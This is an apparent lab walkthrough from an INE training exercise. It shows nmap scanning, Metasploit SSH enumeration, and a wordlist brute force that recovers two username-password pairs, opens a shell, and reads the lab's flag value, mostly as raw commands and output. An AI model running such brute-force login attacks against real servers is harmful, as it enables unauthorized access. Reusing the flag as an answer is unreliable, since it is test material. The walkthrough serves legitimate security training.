@@ -1,0 +1,232 @@
+Target:
+  demo.ine.local
+Tools:
+    auxiliary/scanner/ssh/ssh_version
+    auxiliary/scanner/ssh/ssh_login
+
+Step 1:
+──(root㉿INE)-[~]
+└─# nmap -sS -Pn -A -T5 demo.ine.local
+  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-30 07:34 IST
+  Nmap scan report for demo.ine.local (192.208.84.3)
+  Host is up (0.000059s latency).
+  Not shown: 999 closed tcp ports (reset)
+  PORT   STATE SERVICE VERSION
+  22/tcp open  ssh     OpenSSH 7.9p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
+  | ssh-hostkey: 
+  |   2048 f0:b2:5c:2a:db:13:d8:2f:3f:55:18:6d:3a:ec:01:16 (RSA)
+  |   256 ba:94:13:05:a5:f3:38:85:52:3d:b2:c6:57:70:29:4e (ECDSA)
+  |_  256 da:e9:b0:5b:83:2e:62:04:76:50:8a:02:4c:64:42:bc (ED25519)
+  MAC Address: 02:42:C0:D0:54:03 (Unknown)
+  Device type: general purpose
+  Running: Linux 4.X|5.X
+  OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+  OS details: Linux 4.15 - 5.8
+  Network Distance: 1 hop
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+  
+  TRACEROUTE
+  HOP RTT     ADDRESS
+  1   0.06 ms demo.ine.local (192.208.84.3)
+  
+  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 1.80 seconds
+
+Step 2:
+┌──(root㉿INE)-[~]
+└─# service postgresql start
+  Starting PostgreSQL 16 database server: main.
+┌──(root㉿INE)-[~]
+└─# msfconsole 
+msf6 > workspace -a SSH
+  [*] Added workspace: SSH
+  [*] Workspace: SSH
+msf6 > setg RHOSTS demo.ine.local
+  RHOSTS => demo.ine.local
+
+--Version
+msf6 > use auxiliary/scanner/ssh/ssh_version
+msf6 auxiliary(scanner/ssh/ssh_version) > exploit
+
+  [*] 192.208.84.3 - Key Fingerprint: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDQNOa6QL7Ut9y1RWimBpHbuhZdjMn2nPLc96oZZh8u2
+  [*] 192.208.84.3 - SSH server version: SSH-2.0-OpenSSH_7.9p1 Ubuntu-10
+  [*] 192.208.84.3 - Server Information and Encryption
+  =================================
+  
+    Type                     Value                                 Note
+    ----                     -----                                 ----
+    encryption.compression   none
+    encryption.compression   zlib@openssh.com
+    encryption.encryption    chacha20-poly1305@openssh.com
+    encryption.encryption    aes128-ctr
+    encryption.encryption    aes192-ctr
+    encryption.encryption    aes256-ctr
+    encryption.encryption    aes128-gcm@openssh.com
+    encryption.encryption    aes256-gcm@openssh.com
+    encryption.hmac          umac-64-etm@openssh.com
+    encryption.hmac          umac-128-etm@openssh.com
+    encryption.hmac          hmac-sha2-256-etm@openssh.com
+    encryption.hmac          hmac-sha2-512-etm@openssh.com
+    encryption.hmac          hmac-sha1-etm@openssh.com
+    encryption.hmac          umac-64@openssh.com
+    encryption.hmac          umac-128@openssh.com
+    encryption.hmac          hmac-sha2-256
+    encryption.hmac          hmac-sha2-512
+    encryption.hmac          hmac-sha1
+    encryption.host_key      rsa-sha2-512
+    encryption.host_key      rsa-sha2-256
+    encryption.host_key      ssh-rsa
+    encryption.host_key      ecdsa-sha2-nistp256                   Weak elliptic curve
+    encryption.host_key      ssh-ed25519
+    encryption.key_exchange  curve25519-sha256
+    encryption.key_exchange  curve25519-sha256@libssh.org
+    encryption.key_exchange  ecdh-sha2-nistp256
+    encryption.key_exchange  ecdh-sha2-nistp384
+    encryption.key_exchange  ecdh-sha2-nistp521
+    encryption.key_exchange  diffie-hellman-group-exchange-sha256
+    encryption.key_exchange  diffie-hellman-group16-sha512
+    encryption.key_exchange  diffie-hellman-group18-sha512
+    encryption.key_exchange  diffie-hellman-group14-sha256
+    encryption.key_exchange  diffie-hellman-group14-sha1
+    fingerprint_db           ssh.banner
+    openssh.comment          Ubuntu-10
+    os.cpe23                 cpe:/o:canonical:ubuntu_linux:19.04
+    os.family                Linux
+    os.product               Linux
+    os.vendor                Ubuntu
+    os.version               19.04
+    service.cpe23            cpe:/a:openbsd:openssh:7.9p1
+    service.family           OpenSSH
+    service.product          OpenSSH
+    service.protocol         ssh
+    service.vendor           OpenBSD
+    service.version          7.9p1
+  
+  [*] Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+-Login
+msf6 auxiliary(scanner/ssh/ssh_enumusers) > use auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+  USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+  PASS_FILE => /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > exploit
+
+  [*] 192.208.84.3:22 - Starting bruteforce
+  [+] 192.208.84.3:22 - Success: 'sysadmin:hailey' 'uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin) Linux demo.ine.local 6.8.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC Fri Jul  5 10:34:03 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux '
+  [*] SSH session 1 opened (192.208.84.2:39733 -> 192.208.84.3:22) at 2025-04-30 07:45:55 +0530
+  [+] 192.208.84.3:22 - Success: 'rooty:pineapple' 'uid=1001(rooty) gid=1001(rooty) groups=1001(rooty) Linux demo.ine.local 6.8.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC Fri Jul  5 10:34:03 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux '
+  [*] SSH session 2 opened (192.208.84.2:46045 -> 192.208.84.3:22) at 2025-04-30 07:47:18 +0530
+  ^C[*] Caught interrupt from the console...
+  [*] Auxiliary module execution completed
+
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions
+
+  Active sessions
+  ===============
+  
+    Id  Name  Type         Information  Connection
+    --  ----  ----         -----------  ----------
+    1         shell linux  SSH root @   192.208.84.2:39733 -> 192.208.84.3:22 (192.208.84.3)
+
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 1
+  [*] Starting interaction with 1...
+
+/bin/bash -i
+  bash: cannot set terminal process group (100): Inappropriate ioctl for device
+  bash: no job control in this shell
+sysadmin@demo:~$ find / -name "flag"
+  find / -name "flag"
+  find: '/var/lib/apt/lists/partial': Permission denied
+  find: '/var/lib/private': Permission denied
+  find: '/var/cache/ldconfig': Permission denied
+  find: '/var/cache/apt/archives/partial': Permission denied
+  find: '/var/cache/private': Permission denied
+  find: '/var/log/private': Permission denied
+  find: '/home/rooty/.cache': Permission denied
+  find: '/proc/tty/driver': Permission denied
+  find: '/proc/1/task/1/fd': Permission denied
+  find: '/proc/1/task/1/fdinfo': Permission denied
+  find: '/proc/1/task/1/ns': Permission denied
+  find: '/proc/1/fd': Permission denied
+  find: '/proc/1/map_files': Permission denied
+  find: '/proc/1/fdinfo': Permission denied
+  find: '/proc/1/ns': Permission denied
+  find: '/proc/7/task/7/fd': Permission denied
+  find: '/proc/7/task/7/fdinfo': Permission denied
+  find: '/proc/7/task/7/ns': Permission denied
+  find: '/proc/7/fd': Permission denied
+  find: '/proc/7/map_files': Permission denied
+  find: '/proc/7/fdinfo': Permission denied
+  find: '/proc/7/ns': Permission denied
+  find: '/proc/16/task/16/fd': Permission denied
+  find: '/proc/16/task/16/fdinfo': Permission denied
+  find: '/proc/16/task/16/ns': Permission denied
+  find: '/proc/16/fd': Permission denied
+  find: '/proc/16/map_files': Permission denied
+  find: '/proc/16/fdinfo': Permission denied
+  find: '/proc/16/ns': Permission denied
+  find: '/proc/17/task/17/fd': Permission denied
+  find: '/proc/17/task/17/fdinfo': Permission denied
+  find: '/proc/17/task/17/ns': Permission denied
+  find: '/proc/17/fd': Permission denied
+  find: '/proc/17/map_files': Permission denied
+  find: '/proc/17/fdinfo': Permission denied
+  find: '/proc/17/ns': Permission denied
+  find: '/proc/82/task/82/fd': Permission denied
+  find: '/proc/82/task/82/fdinfo': Permission denied
+  find: '/proc/82/task/82/ns': Permission denied
+  find: '/proc/82/fd': Permission denied
+  find: '/proc/82/map_files': Permission denied
+  find: '/proc/82/fdinfo': Permission denied
+  find: '/proc/82/ns': Permission denied
+  find: '/proc/93/task/93/fd': Permission denied
+  find: '/proc/93/task/93/fdinfo': Permission denied
+  find: '/proc/93/task/93/ns': Permission denied
+  find: '/proc/93/fd': Permission denied
+  find: '/proc/93/map_files': Permission denied
+  find: '/proc/93/fdinfo': Permission denied
+  find: '/proc/93/ns': Permission denied
+  find: '/proc/158/task/158/fd': Permission denied
+  find: '/proc/158/task/158/fdinfo': Permission denied
+  find: '/proc/158/task/158/ns': Permission denied
+  find: '/proc/158/fd': Permission denied
+  find: '/proc/158/map_files': Permission denied
+  find: '/proc/158/fdinfo': Permission denied
+  find: '/proc/158/ns': Permission denied
+  find: '/proc/173/task/173/fd': Permission denied
+  find: '/proc/173/task/173/fdinfo': Permission denied
+  find: '/proc/173/task/173/ns': Permission denied
+  find: '/proc/173/fd': Permission denied
+  find: '/proc/173/map_files': Permission denied
+  find: '/proc/173/fdinfo': Permission denied
+  find: '/proc/173/ns': Permission denied
+  find: '/proc/180/task/180/fd': Permission denied
+  find: '/proc/180/task/180/fdinfo': Permission denied
+  find: '/proc/180/task/180/ns': Permission denied
+  find: '/proc/180/fd': Permission denied
+  find: '/proc/180/map_files': Permission denied
+  find: '/proc/180/fdinfo': Permission denied
+  find: '/proc/180/ns': Permission denied
+  find: '/proc/222/task/222/fd': Permission denied
+  find: '/proc/222/task/222/fdinfo': Permission denied
+  find: '/proc/222/task/222/ns': Permission denied
+  find: '/proc/222/fd': Permission denied
+  find: '/proc/222/map_files': Permission denied
+  find: '/proc/222/fdinfo': Permission denied
+  find: '/proc/222/ns': Permission denied
+  find: '/proc/226/task/226/fd': Permission denied
+  find: '/proc/226/task/226/fdinfo': Permission denied
+  find: '/proc/226/task/226/ns': Permission denied
+  find: '/proc/226/fd': Permission denied
+  find: '/proc/226/map_files': Permission denied
+  find: '/proc/226/fdinfo': Permission denied
+  find: '/proc/226/ns': Permission denied
+  find: '/root': Permission denied
+  find: '/etc/ssl/private': Permission denied
+  /flag
+sysadmin@demo:~$ cat /flag
+  cat /flag
+  eb09cc6f1cd72756da145892892fbf5a
+
